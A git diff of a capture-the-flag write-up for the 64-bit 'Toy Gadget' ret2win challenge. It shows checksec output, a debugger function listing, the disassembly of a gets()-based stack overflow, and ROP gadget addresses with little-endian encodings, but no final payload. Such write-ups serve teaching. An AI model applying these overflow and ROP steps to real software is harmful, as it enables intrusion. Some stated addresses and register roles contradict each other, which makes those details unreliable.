@@ -1,7 +1,7 @@
 ---
 title: Toy Gadget
 author: yufong
-categories:  [GreyCTF 2025, Pwn]
+categories:  [CyberBlitz 2025, Pwn]
 date: 2025-12-22
 tags: 
   - 64-bit
@@ -35,15 +35,12 @@ Main
 
 ![]({{ page.img_path }}toy_gadget-1766342952838.png)
 
-![]({{ page.img_path }}toy_gadget-1766345284065.png)
-
 Question
 
 ![]({{ page.img_path }}toy_gadget-1766342936439.png)
 
 >[!WARNING] `gets` used, susceptible to buffer overflow
 
-![]({{ page.img_path }}toy_gadget-1766345306125.png)
 
 Win
 
@@ -56,18 +53,19 @@ Win
 >- Argument 2
 >	- `0xdeadc0de`
 >	- `\xde\xc0\xad\xde\x00\x00\x00\x00`
-{: .prompt-info}
 
 ![]({{ page.img_path }}toy_gadget-1766345257682.png)
 
 > To Note
 >- Address: `0x4011c0`
 >- Little-Endian: `\xc0\x11\x40\x00\x00\x00\x00\x00`
-{: .prompt-info}
 
 The objective is to redirect execution flow to the `win` function while correctly setting its two required arguments.
 
-## Check Security
+
+## Exploit
+
+### Check Security
 
 ```
 ~/labs/ctf/cyberblitz2025/pwn/toy_gadget
@@ -76,9 +74,9 @@ gadget: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
 ```
 
 > Breakdown
->- The binary is **not stripped**, meaning symbol information is preserved.
->- Function names (e.g. `main`, `win`) and symbol addresses are available directly in tools like `objdump`, `nm`, `gdb`, and pwntools.
->- TLDR, easier to rev.
+>- The binary is not stripped, meaning symbol information is preserved.
+>- Function names (e.g. `main`, `win`) and symbol addresses are available.
+>- TLDR, easier to understand when rev.
 
 ```
 ~/labs/ctf/cyberblitz2025/pwn/toy_gadget
@@ -100,14 +98,72 @@ gadget: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
 ```
 
 > Breakdown
+>- `canary: no`
+>	- Don't need to find offset to canary. The return address can be overwritten directly.
 >- `nx:yes`
 >	- The stack is non-executable, preventing injected shellcode from running.
 >	- Don't matter here since its a `ret2win` challenge.
 >- `pie:no`
 >	- The binary is loaded at a fixed base address.
->	- Function and gadget addresses remain constant across runs, eliminating the need for a PIE leak.
+>	- Don't need PIE leak.
 
-## Exploit
+### Vulnerability Analysis
+
+1. View functions
+
+	```
+	pwndbg> info func
+	All defined functions:
+	
+	Non-debugging symbols:
+	0x0000000000401000  _init
+	0x0000000000401030  puts@plt
+	0x0000000000401040  setbuf@plt
+	0x0000000000401050  printf@plt
+	0x0000000000401060  fgets@plt
+	0x0000000000401070  gets@plt
+	0x0000000000401080  fopen@plt
+	0x0000000000401090  main
+	0x00000000004010c0  _start
+	0x00000000004010f0  _dl_relocate_static_pie
+	0x0000000000401100  deregister_tm_clones
+	0x0000000000401130  register_tm_clones
+	0x0000000000401170  __do_global_dtors_aux
+	0x00000000004011a0  frame_dummy
+	0x00000000004011b0  callmee
+	0x00000000004011c0  question
+	0x00000000004011e0  win
+	0x000000000040124c  _fini
+	pwndbg>
+	```
+
+	>To Note
+	>- Address: `4011e0`
+	>- Little-Endian: `\xe0\x11\x40\x00\x00\x00\x00\x00`
+
+2. Disassemble question
+
+	```
+	pwndbg> disas question
+	Dump of assembler code for function question:
+	   0x00000000004011c0 <+0>:     sub    rsp,0x48
+	   0x00000000004011c4 <+4>:     mov    edi,0x402008
+	   0x00000000004011c9 <+9>:     xor    eax,eax
+	   0x00000000004011cb <+11>:    call   0x401050 <printf@plt>
+	   0x00000000004011d0 <+16>:    mov    rdi,rsp
+	   0x00000000004011d3 <+19>:    xor    eax,eax
+	   0x00000000004011d5 <+21>:    call   0x401070 <gets@plt>
+	   0x00000000004011da <+26>:    add    rsp,0x48
+	   0x00000000004011de <+30>:    ret
+	End of assembler dump.
+	```
+
+	>Breakdown
+	>1. Allocates 72 bytes on the stack directly below the saved return address.
+	>2. Passes the stack pointer as the destination buffer to `gets`.
+	>	- No write limit at all.
+	>3. Restores `rsp`, then `ret` loads the next 8 bytes from the stack into `rip`.
+	>	- Execution is redirected if we overwrite RIP.
 
 ### Find RIP Offset
 
@@ -161,9 +217,10 @@ Unlike 32-bit binaries where we can just add the 2 arguments right after the ret
 	```
 
 	> To Note
+	>- Utilized for stack alignment.
 	>- Address: `401016`
 	>- Little-Endian: `\x16\x10\x40\x00\x00\x00\x00\x00`
-	{: .prompt-info}
+	
 
 2. Find `pop rdi`
 
@@ -181,9 +238,10 @@ Unlike 32-bit binaries where we can just add the 2 arguments right after the ret
 	```
 
 	> To Note
+	>- Utilized to set the first function argument (`rdi`).
 	>- Address: `4011b0`
 	>- Little-Endian: `\xb0\x11\x40\x00\x00\x00\x00\x00`
-	{: .prompt-info}
+	
 
 3. Find `pop rsi`
 
@@ -201,9 +259,10 @@ Unlike 32-bit binaries where we can just add the 2 arguments right after the ret
 	```
 
 	> To Note
+	>- Utilized to set the first function argument (`rsi`).
 	>- Address: `4011b0`
 	>- Little-Endian: `\xb2\x11\x40\x00\x00\x00\x00\x00`
-	{: .prompt-info}
+	
 
 ### Manual
 
